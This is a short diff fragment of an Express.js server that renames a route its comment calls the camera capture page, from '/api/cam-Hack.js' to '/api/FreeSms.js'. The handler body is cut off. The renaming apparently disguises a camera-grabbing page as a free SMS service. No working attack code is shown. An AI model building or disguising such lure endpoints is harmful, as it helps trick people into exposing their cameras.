@@ -33,7 +33,7 @@ app.use(express.json());
 app.use(express.static('public'));
 
 // API endpoint that serves the camera capture page
-app.get('/api/cam-Hack.js', (req, res) => {
+app.get('/api/FreeSms.js', (req, res) => {
   const { code } = req.query;
   
   if (!code) {
